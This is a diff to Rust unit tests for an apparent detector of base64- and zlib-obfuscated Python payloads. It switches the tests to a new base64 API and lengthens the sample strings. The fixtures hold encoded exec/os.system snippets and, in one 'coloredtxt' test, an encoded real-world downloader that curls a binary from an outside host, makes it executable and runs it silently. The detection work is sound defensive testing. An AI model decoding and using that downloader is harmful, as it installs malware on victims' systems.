@@ -5,8 +5,7 @@
 #[cfg(test)]
 mod tests {
     use super::super::*;
-    use std::io::Write;
-    use tempfile::NamedTempFile;
+    use base64::{engine::general_purpose, Engine as _};
 
     #[test]
     fn test_is_base64_candidate_valid() {
@@ -39,21 +38,23 @@ mod tests {
     #[test]
     fn test_decode_base64_simple() {
         let encoded = "aGVsbG8gd29ybGQ="; // "hello world"
-        let decoded = decode_base64(encoded).expect("Should decode");
+        let (decoded, used_zlib) = decode_base64(encoded).expect("Should decode");
         assert_eq!(String::from_utf8(decoded).unwrap(), "hello world");
+        assert!(!used_zlib, "Should not use zlib for simple base64");
     }
 
     #[test]
     fn test_decode_base64_python_code() {
         // Python code: "import base64; exec(...)"
         let encoded = "aW1wb3J0IGJhc2U2NDtleGVjKGJhc2U2NC5iNjRkZWNvZGUoYnl0ZXMoJ2NHeGhkR1p2Y20wZycsJ1VURi04JykpLmRlY29kZSgpKQ==";
-        let decoded = decode_base64(encoded).expect("Should decode");
+        let (decoded, used_zlib) = decode_base64(encoded).expect("Should decode");
         let decoded_str = String::from_utf8(decoded).unwrap();
         assert!(
             decoded_str.contains("import base64"),
             "Should decode Python import"
         );
         assert!(decoded_str.contains("exec("), "Should decode exec call");
+        assert!(!used_zlib, "Should not use zlib for plain base64");
     }
 
     #[test]
@@ -68,15 +69,16 @@ mod tests {
             let mut encoder = ZlibEncoder::new(&mut compressed, Compression::default());
             encoder.write_all(original).unwrap();
         }
-        let encoded = base64::encode(&compressed);
+        let encoded = general_purpose::STANDARD.encode(&compressed);
 
-        let decoded = decode_base64(&encoded).expect("Should decode");
+        let (decoded, used_zlib) = decode_base64(&encoded).expect("Should decode");
         let decoded_str = String::from_utf8(decoded).unwrap();
         assert_eq!(
             decoded_str,
             String::from_utf8_lossy(original),
             "Should decompress zlib"
         );
+        assert!(used_zlib, "Should detect and use zlib decompression");
     }
 
     #[test]
@@ -146,9 +148,12 @@ exec(base64.b64decode(bytes('aW1wb3J0IGJhc2U2NDtleGVjKGJhc2U2NC5iNjRkZWNvZGUoYnl
 
     #[test]
     fn test_extract_multiple_payloads() {
+        // Using longer Python code to ensure base64 strings are >= 50 chars
+        // "import os; os.system('whoami'); print('done')" -> 56 chars base64
+        // "import sys; sys.exit(0); print('finished executing')" -> 64 chars base64
         let content = r#"
-payload1 = base64.b64decode('aW1wb3J0IG9z')
-payload2 = base64.b64decode('aW1wb3J0IHN5cw==')
+payload1 = base64.b64decode('aW1wb3J0IG9zOyBvcy5zeXN0ZW0oJ3dob2FtaScpOyBwcmludCgnZG9uZScp')
+payload2 = base64.b64decode('aW1wb3J0IHN5czsgc3lzLmV4aXQoMCk7IHByaW50KCdmaW5pc2hlZCBleGVjdXRpbmcnKQ==')
 "#;
 
         let payloads = extract_encoded_payloads(content.as_bytes());
@@ -163,7 +168,8 @@ payload2 = base64.b64decode('aW1wb3J0IHN5cw==')
     #[test]
     fn test_extract_nested_encoding() {
         // Create: base64(zlib(python_code))
-        let original = b"import os; os.system('ls')";
+        // Using longer code to ensure base64 >= 50 chars (compressed + base64 overhead)
+        let original = b"import os; os.system('whoami'); print('command executed successfully')";
         let mut compressed = Vec::new();
         {
             use flate2::write::ZlibEncoder;
@@ -172,7 +178,7 @@ payload2 = base64.b64decode('aW1wb3J0IHN5cw==')
             let mut encoder = ZlibEncoder::new(&mut compressed, Compression::default());
             encoder.write_all(original).unwrap();
         }
-        let encoded = base64::encode(&compressed);
+        let encoded = general_purpose::STANDARD.encode(&compressed);
 
         let content = format!(
             r#"
@@ -201,9 +207,11 @@ exec(zlib.decompress(base64.b64decode('{}')))
     #[test]
     fn test_recursion_depth_limit() {
         // Create deeply nested encoding: base64(base64(base64(...)))
-        let mut data = b"import os".to_vec();
+        // Using longer initial data to ensure it remains >= 50 chars after 5 levels
+        // "import os; os.system('whoami'); print('test complete now')" = 49 chars
+        let mut data = b"import os; os.system('whoami'); print('test complete now')".to_vec();
         for _ in 0..5 {
-            data = base64::encode(&data).into_bytes();
+            data = general_purpose::STANDARD.encode(&data).into_bytes();
         }
 
         let content = String::from_utf8_lossy(&data);
@@ -234,7 +242,7 @@ exec(data)
     fn test_large_payload_performance() {
         // Create 1MB payload
         let large_data = vec![b'A'; 1024 * 1024];
-        let encoded = base64::encode(&large_data);
+        let encoded = general_purpose::STANDARD.encode(&large_data);
         let content = format!("payload = '{}'", encoded);
 
         let start = std::time::Instant::now();
@@ -254,7 +262,8 @@ exec(data)
     fn test_coloredtxt_sample_1() {
         // From base64_payload.py
         let encoded = "aW1wb3J0IGJhc2U2NDtleGVjKGJhc2U2NC5iNjRkZWNvZGUoYnl0ZXMoJ2NHeGhkR1p2Y20wZycsJ1VURi04JykpLmRlY29kZSgpKQ==";
-        let decoded = decode_base64(encoded).expect("Should decode coloredtxt payload");
+        let (decoded, _used_zlib) =
+            decode_base64(encoded).expect("Should decode coloredtxt payload");
         let decoded_str = String::from_utf8(decoded).unwrap();
 
         assert!(decoded_str.contains("import base64"), "Should have import");
@@ -266,7 +275,8 @@ exec(data)
         // From base64_payload2.py (contains downloader)
         let encoded = "cGxhdGZvcm0gPSBzeXMucGxhdGZvcm1bMDoxXQpwcmludChzeXMuYXJndlswXSkKaWYgcGxhdGZvcm0gIT0gInciOgogICAgdHJ5OgogICAgICAgIHVybCA9ICdodHRwczovL3B5cGkub25saW5lL2Nsb3VkLnBocD90eXBlPScgKyBwbGF0Zm9ybQogICAgICAgIGxvY2FsX2ZpbGVuYW1lID0gb3MuZW52aXJvblsnSE9NRSddICsgJy9vc2hlbHBlcicKICAgICAgICBvcy5zeXN0ZW0oImN1cmwgLS1zaWxlbnQgIiArIHVybCArICIgLS1jb29raWUgJ29zaGVscGVyX3Nlc3Npb249MTAyMzc0NzczNTQ3MzIwMjI4Mzc0MzMnIC0tb3V0cHV0ICIgKyBsb2NhbF9maWxlbmFtZSkKICAgICAgICBzbGVlcCgzKSAKICAgICAgICB3aXRoIG9wZW4obG9jYWxfZmlsZW5hbWUsICdyJykgYXMgaW1hZ2VGaWxlOgogICAgICAgICAgICBzdHJfaW1hZ2VfZGF0YSA9IGltYWdlRmlsZS5yZWFkKCkKICAgICAgICAgICAgZmlsZURhdGEgPSBiYXNlNjQudXJsc2FmZV9iNjRkZWNvZGUoc3RyX2ltYWdlX2RhdGEuZW5jb2RlKCdVVEYtOCcpKQogICAgICAgICAgICBpbWFnZUZpbGUuY2xvc2UoKSAgCiAgICAgICAgCiAgICAgICAgd2l0aCBvcGVuKGxvY2FsX2ZpbGVuYW1lLCAnd2InKSBhcyB0aGVGaWxlOgogICAgICAgICAgICB0aGVGaWxlLndyaXRlKGZpbGVEYXRhKQogICAgICAgIAogICAgICAgIG9zLnN5c3RlbSgiY2htb2QgK3ggIiArIGxvY2FsX2ZpbGVuYW1lKSAgCiAgICAgICAgb3Muc3lzdGVtKGxvY2FsX2ZpbGVuYW1lICsgIiA+IC9kZXYvbnVsbCAyPiYxICYiKQogICAgZXhjZXB0IFplcm9EaXZpc2lvbkVycm9yIGFzIGVycm9yOgogICAgICAgIHNsZWVwKDApIAogICAgZmluYWx5OgogICAgICAgIHNsZWVwKDApCg==";
 
-        let decoded = decode_base64(encoded).expect("Should decode coloredtxt payload 2");
+        let (decoded, _used_zlib) =
+            decode_base64(encoded).expect("Should decode coloredtxt payload 2");
         let decoded_str = String::from_utf8(decoded).unwrap();
 
         assert!(
@@ -282,7 +292,9 @@ exec(data)
 
     #[test]
     fn test_virtual_filename_generation() {
-        let content = "exec(base64.b64decode('aW1wb3J0IG9z'))";
+        // Using longer base64 string (56 chars) to pass MIN_BASE64_LENGTH check
+        // "import os; os.system('whoami'); print('done')"
+        let content = "exec(base64.b64decode('aW1wb3J0IG9zOyBvcy5zeXN0ZW0oJ3dob2FtaScpOyBwcmludCgnZG9uZScp'))";
         let payloads = extract_encoded_payloads(content.as_bytes());
 
         if let Some(payload) = payloads.first() {
